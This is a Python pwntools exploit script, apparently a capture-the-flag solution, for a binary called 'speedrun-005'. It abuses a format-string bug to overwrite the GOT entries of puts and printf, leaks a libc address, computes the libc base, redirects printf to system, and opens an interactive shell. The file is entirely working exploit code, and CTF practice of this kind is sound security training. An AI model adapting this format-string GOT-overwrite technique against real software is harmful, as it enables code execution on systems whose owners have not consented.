#!/usr/bin/env python3
from pwn import *

r = process(["./ld-2.27.so", "./speedrun-005"], env={"LD_PRELOAD": "./libc-2.27.so", "DEBUG": "true"})
# r = remote("172.17.0.6", 31337)
e = ELF("./speedrun-005")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc-2.27.so")
pause()
print(r.recv())

vuln = 0x000000000040072d

# set puts GOT to vuln function addr with fmt string
payload = fmtstr_payload(9, {e.got['puts']+4: 0x0}, write_size="short")[:-4]
payload += b"aaaa"+fmtstr_payload(6, {e.got['puts']: vuln}, numbwritten=7)[:-8]
payload += b"\x00\x00\x00\x00" + p32(e.got['puts']+4) + b"\x00\x00\x00\x00"+p32(e.got['puts'])+ b"\x00\x00\x00\x00" + p32(e.got['puts']+2)+b"\x00\x00\x00\x00"
# payload += b"%43$p"

r.send(payload)
# print(r.recv())
r.recv()

# for i in range(50):
# 	r.send(f"%{i}$p".encode())

# 	leak = r.recv()
# 	print(f"{i} = {leak}")
r.send(b"%p "*100)
# print(r.recv())
leak = int(b"".join(x for x in r.recv().split() if b"9d0" in x).decode(), 16)
log.success(f"GOT LEAK: {hex(leak)}")
libc.address = leak - 0x119d0
log.success(f"GOT BASE: {hex(leak-0x119d0)}")
system = libc.sym['system'] & 0xffffffff # get just the bytes that differ from printf
print(hex(system))

payload = fmtstr_payload(4, {e.got['printf']: system}, write_size="short") + b"\x00\x00\x00\x00" + p32(e.got['printf']+2) + b"\x00\x00\x00\x00" + p32(e.got['printf'])
print(payload)
r.send(payload)

r.interactive()
